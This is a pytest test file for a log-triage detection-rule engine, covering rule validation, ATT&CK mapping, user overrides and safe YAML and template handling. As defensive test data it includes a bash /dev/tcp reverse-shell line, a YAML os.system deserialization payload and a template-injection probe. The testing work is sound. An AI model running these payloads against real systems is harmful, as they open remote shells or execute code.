"""Detection-as-code quality gates: every packaged rule is valid, mapped to ATT&CK and self-tested."""
import pytest

from owltriage.rules import RuleError, build_rule, load_rules, load_techniques, render_template, run_rule_tests

RULESET = load_rules()
TECHNIQUES = load_techniques()
REGEX_RULES = [r for r in RULESET.rules.values() if r.type != "correlation"]


@pytest.mark.parametrize("rule_id", sorted(r.id for r in REGEX_RULES))
def test_packaged_rule_examples(rule_id):
    """CI names the exact rule whose examples break."""
    [result] = run_rule_tests(RULESET, [rule_id])
    assert result.ok, result.failures


@pytest.mark.parametrize("rule_id", sorted(r.id for r in REGEX_RULES))
def test_packaged_rules_have_both_kinds_of_examples(rule_id):
    tests = RULESET.rules[rule_id].tests
    assert tests.get("match"), "add at least one 'match' example"
    assert tests.get("no_match"), "add at least one 'no_match' example (a realistic benign look-alike)"


def test_every_finding_rule_maps_to_attack_except_blocklist():
    for rule in RULESET.rules.values():
        if rule.id != "blocklist-match":
            assert rule.mitre, f"{rule.id} has no ATT&CK technique"
        for technique in rule.mitre:
            assert technique in TECHNIQUES


def test_correlation_rules_are_all_present():
    assert {r.id for r in RULESET.rules.values() if r.type == "correlation"} == {
        "auth-brute-force", "auth-success-after-brute-force", "auth-success-from-bad-ip",
        "blocklist-match", "encoded-payload", "hidden-ip-in-payload"}


BASE = {"id": "web-test", "name": "TEST", "title": "t", "type": "web", "severity": "high",
        "mitre": ["T1190"], "pattern": "abc"}


@pytest.mark.parametrize("change, message", [
    ({"id": "Bad Id"}, "kebab-case"),
    ({"name": "lower"}, "UPPER_SNAKE_CASE"),
    ({"type": "magic"}, "unknown type"),
    ({"severity": "urgent"}, "severity must be"),
    ({"mitre": ["T9999"]}, "not in resources/attack.yml"),
    ({"mitre": ["X1"]}, "not an ATT&CK technique ID"),
    ({"pattern": "(unclosed"}, "invalid regex"),
    ({"patern": "typo"}, "unknown key"),
    ({"fields": ["cookie"]}, "unknown web field"),
    ({"block": "sideways"}, "inbound or outbound"),
])
def test_invalid_rules_are_rejected_with_a_clear_message(change, message):
    with pytest.raises(RuleError, match=message):
        build_rule({**BASE, **change}, TECHNIQUES, "mine.yml")


def test_event_rule_needs_event_id():
    with pytest.raises(RuleError, match="event_id"):
        build_rule({**BASE, "type": "event", "pattern": None, "match": {"fields": {"A": "b"}}}, TECHNIQUES)


def test_unknown_correlation_is_rejected():
    with pytest.raises(RuleError, match="unknown correlation"):
        build_rule({**BASE, "id": "my-correlation", "type": "correlation"}, TECHNIQUES)


def test_duplicate_ids_in_packaged_rules_are_rejected(tmp_path):
    (tmp_path / "a.yml").write_text("- {id: web-dup, name: DUP, title: t, type: web, severity: low, pattern: a}\n")
    (tmp_path / "b.yml").write_text("- {id: web-dup, name: DUP, title: t, type: web, severity: low, pattern: b}\n")
    with pytest.raises(RuleError, match="duplicate rule id"):
        load_rules(packaged_dir=tmp_path)


def test_user_directory_overrides_only_the_keys_it_sets(tmp_path):
    (tmp_path / "tune.yml").write_text("- id: auth-brute-force\n  threshold: 20\n- id: web-xss\n  enabled: false\n")
    ruleset = load_rules([tmp_path])
    brute = ruleset.rules["auth-brute-force"]
    assert brute.param("threshold") == 20 and brute.param("window_seconds") == 600 and brute.severity == "high"
    assert ruleset.rules["web-xss"].enabled is False
    assert ruleset.rules["web-xss"] not in ruleset.enabled("web")


def test_invalid_yaml_and_missing_dir_are_reported(tmp_path):
    (tmp_path / "broken.yml").write_text("- id: x\n  title: [unclosed\n")
    with pytest.raises(RuleError, match="invalid YAML"):
        load_rules([tmp_path])
    with pytest.raises(RuleError, match="not found"):
        load_rules([tmp_path / "nope"])


def test_yaml_cannot_execute_code(tmp_path):
    (tmp_path / "evil.yml").write_text("- !!python/object/apply:os.system ['echo pwned']\n")
    with pytest.raises(RuleError, match="invalid YAML"):  # refused by safe_load, never constructed
        load_rules([tmp_path])


def test_detail_templates_cannot_reach_python_internals():
    assert render_template("{TargetUserName} {__class__} {0.__class__}", {"TargetUserName": "bob"}) == \
        "bob ? {0.__class__}"
    assert render_template("{A} {B} by {C}", {"A": "-", "B": "x", "C": "y"}) == "x by y"


def test_rule_regexes_have_bounded_input():
    """Rules only ever see the first MAX_INPUT characters, which bounds worst-case regex time."""
    rule = RULESET.rules["cmd-reverse-shell-devtcp"]
    assert rule.search("bash -i >& /dev/tcp/203.0.113.9/4444")
    assert rule.search("a" * 100_000 + " /dev/tcp/203.0.113.9/4444") is None  # beyond MAX_INPUT
